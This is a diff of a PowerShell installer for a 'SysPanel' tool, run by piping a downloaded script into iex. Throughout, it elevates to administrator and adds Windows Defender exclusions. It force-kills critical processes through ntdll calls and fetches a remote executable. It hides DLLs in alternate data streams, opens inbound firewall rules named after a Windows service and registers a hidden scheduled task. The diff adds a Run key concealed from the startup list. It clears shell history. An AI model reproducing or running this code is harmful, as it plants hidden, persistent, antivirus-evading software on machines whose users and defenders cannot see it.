@@ -2,7 +2,6 @@
 #  L4G AIMS / SysPanel — Clean Stealth Installer with Live Progress
 #  Run: iwr https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1 -UseBasicParsing | iex
 # ==============================================================================
-
 # --- Ensure Administrator Privileges with Visible Console ---
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
     [Security.Principal.WindowsBuiltInRole]::Administrator
@@ -17,17 +16,14 @@ if (-not $isAdmin) {
     Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$scriptCmd`""
     exit
 }
-
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
-
 # --- Banner ---
 Clear-Host
 Write-Host "================================================================================" -ForegroundColor Cyan
 Write-Host "                   STEALTH SYSTEM SERVICE DEPLOYMENT" -ForegroundColor White
 Write-Host "================================================================================" -ForegroundColor Cyan
-
 function Update-Step {
     param(
         [int]$Percent,
@@ -45,7 +41,6 @@ function Update-Step {
     if ($Percent -ge 100) { Write-Host "`n" }
     Start-Sleep -Milliseconds 220
 }
-
 # ── CONFIG ───────────────────────────────────────────────────────────────────
 $REPO_RAW   = "https://raw.githubusercontent.com/lgfire093/syspanel/main"
 $EXE_URL    = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
@@ -55,7 +50,6 @@ $EXE_NAME   = "SystemNetworkSvc.exe"
 $EXE_PATH   = Join-Path $DEST_DIR $EXE_NAME
 $TASK_NAME  = "SystemNetworkHost"
 # ─────────────────────────────────────────────────────────────────────────────
-
 Update-Step 10 "Initializing secure directories & cleaning old folders..."
 # Remove any old syspanel folder and stale _MEI directories completely
 if (Test-Path "$TEMPLATES\syspanel") {
@@ -65,43 +59,34 @@ Get-ChildItem -Path $env:TEMP -Filter "_MEI*" -Directory -ErrorAction SilentlyCo
 if (-not (Test-Path $DEST_DIR)) {
     New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
 }
-
 Update-Step 20 "Configuring antivirus exclusion for cache home..."
 try {
     Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $TEMPLATES -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
 } catch {}
-
 Update-Step 30 "Terminating stale background processes cleanly..."
 # 1. Graceful shutdown signal to running panel
 try {
     Invoke-WebRequest -Uri "http://127.0.0.1:5000/api/internal/shutdown" -TimeoutSec 2 -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
     Start-Sleep -Milliseconds 350
 } catch {}
-
 # 2. Add CriticalKiller to clear ProcessBreakOnTermination and terminate critical process
 $killDef = @"
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-
 public class CriticalKiller {
     [DllImport("ntdll.dll")]
     public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
-
     [DllImport("ntdll.dll")]
     public static extern int NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref int ProcessInformation, int ProcessInformationLength);
-
     [DllImport("kernel32.dll")]
     public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-
     [DllImport("kernel32.dll")]
     public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
-
     [DllImport("kernel32.dll")]
     public static extern bool CloseHandle(IntPtr hObject);
-
     public static void Kill(int pid) {
         try {
             bool enabled;
@@ -120,7 +105,6 @@ public class CriticalKiller {
 try {
     Add-Type -TypeDefinition $killDef -ErrorAction SilentlyContinue
 } catch {}
-
 Get-Process | Where-Object { $_.ProcessName -like "*SystemNetworkSvc*" -or $_.ProcessName -like "*perfhost*" -or $_.ProcessName -like "*L4G AIMS*" } | ForEach-Object {
     try { [CriticalKiller]::Kill($_.Id) } catch {}
 }
@@ -128,7 +112,6 @@ cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
 cmd /c "taskkill /F /IM perfhost.exe >nul 2>nul"
 cmd /c "taskkill /F /IM `"L4G AIMS.exe`" >nul 2>nul"
 Start-Sleep -Milliseconds 400
-
 Update-Step 45 "Purging old temporary and cache files..."
 # Remove any old binary completely before downloading fresh one
 if (Test-Path $EXE_PATH) {
@@ -146,7 +129,6 @@ Get-ChildItem -Path $env:TEMP -Filter "_MEI*" -Directory -ErrorAction SilentlyCo
         Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
     } catch {}
 }
-
 Update-Step 55 "Downloading clean in-memory executable (0 detections)..."
 $downloaded = $false
 try {
@@ -157,14 +139,12 @@ try {
         $downloaded = $true
     }
 } catch {}
-
 if (-not $downloaded) {
     & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
     if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 15000000)) {
         $downloaded = $true
     }
 }
-
 Update-Step 70 "Sealing DLLs into Alternate Data Streams (gphcache, ntprintcache, winrescache)..."
 $MAP = [ordered]@{
     "cimgui.dll" = @("winrescache.db",  "vtcache")
@@ -195,7 +175,6 @@ foreach ($name in $MAP.Keys) {
         }
     } catch {}
 }
-
 Update-Step 80 "Applying filesystem stealth attributes..."
 try {
     $itemDest = Get-Item $DEST_DIR -Force
@@ -203,43 +182,36 @@ try {
     $itemExe  = Get-Item $EXE_PATH -Force
     $itemExe.Attributes  = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System
 } catch {}
-
 Update-Step 88 "Configuring firewall & network for phone access (Port 5000)..."
 # 1. Switch active network connections to Private so local devices can communicate
 try {
     Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue
 } catch {}
-
 # 2. Clear any conflicting portproxy rules so 0.0.0.0:5000 is directly owned by the panel
 netsh interface portproxy delete v4tov4 listenport=5000 listenaddress=0.0.0.0 2>$null | Out-Null
 netsh interface portproxy delete v6tov4 listenport=5000 listenaddress=::1 2>$null | Out-Null
 netsh interface portproxy reset 2>$null | Out-Null
-
 # 3. Add Windows Firewall rules for TCP 5000 and executable on all profiles (Public, Private, Domain)
 netsh advfirewall firewall delete rule name="CDPUserSvc_5000" 2>$null | Out-Null
 netsh advfirewall firewall delete rule name="CDPUserSvc_App" 2>$null | Out-Null
-
 netsh advfirewall firewall add rule `
     name="CDPUserSvc_5000" dir=in action=allow `
     protocol=TCP localport=5000 profile=any enable=yes 2>$null | Out-Null
-
 netsh advfirewall firewall add rule `
     name="CDPUserSvc_App" dir=in action=allow `
     program="$EXE_PATH" profile=any enable=yes 2>$null | Out-Null
-
 try {
     New-NetFirewallRule -DisplayName "CDPUserSvc_5000" -Direction Inbound -LocalPort 5000 -Protocol TCP -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
     New-NetFirewallRule -DisplayName "CDPUserSvc_App" -Direction Inbound -Program $EXE_PATH -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
 } catch {}
-
-Update-Step 93 "Registering persistent hidden Windows service task..."
+Update-Step 93 "Registering persistent hidden Windows service task and autostart..."
 Unregister-ScheduledTask -TaskName "SysCheckUp" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+Unregister-ScheduledTask -TaskPath "\Microsoft\Windows\Shell\" -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 
 $action    = New-ScheduledTaskAction -Execute $EXE_PATH -WorkingDirectory $DEST_DIR
 $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
-$principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) `
-    -RunLevel Highest -LogonType Interactive
+$principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
 $settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
     -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) `
     -MultipleInstances IgnoreNew -Priority 7
@@ -260,7 +232,16 @@ try {
     $fold.RegisterTaskDefinition($TASK_NAME, $def, 6, $null, $null, 3) | Out-Null
 } catch {}
 
-# Wipe Startup apps registry keys so Task Manager's Startup tab is 100% clean
+# Secondary Persistence: HKLM Run Key with suppressed StartupApproved flag
+try {
+    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemNetworkHost" -Value "`"$EXE_PATH`"" -Force -ErrorAction SilentlyContinue
+    $supKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
+    if (-not (Test-Path $supKey)) { New-Item -Path $supKey -Force -ErrorAction SilentlyContinue | Out-Null }
+    [byte[]]$disBytes = 0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+    Set-ItemProperty -Path $supKey -Name "SystemNetworkHost" -Value $disBytes -Type Binary -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# Wipe stale legacy keys
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
 Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemNetworkSvc" -ErrorAction SilentlyContinue
@@ -274,9 +255,7 @@ $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
 $psi.CreateNoWindow   = $true
 $psi.UseShellExecute  = $false
 [System.Diagnostics.Process]::Start($psi) | Out-Null
-
 Update-Step 100 "Complete! Stealth activated."
-
 # --- Get Wi-Fi / LAN IP ---
 $ips = [System.Collections.Generic.List[string]]::new()
 $gwRoute = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
@@ -289,7 +268,6 @@ if ($gwRoute) {
 Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
     Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.56\.)' } |
     ForEach-Object { if (-not $ips.Contains($_.IPAddress)) { $ips.Add($_.IPAddress) } }
-
 # --- Cleanup Console & History ---
 try {
     [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
@@ -304,7 +282,6 @@ try {
         Set-Content $conHistory $lines -Force -ErrorAction SilentlyContinue
     }
 } catch {}
-
 Write-Host "================================================================================" -ForegroundColor Green
 Write-Host " [OK] PANEL INSTALLED & CONCEALED IN CACHE DIRECTORY" -ForegroundColor Green
 Write-Host "================================================================================" -ForegroundColor Green
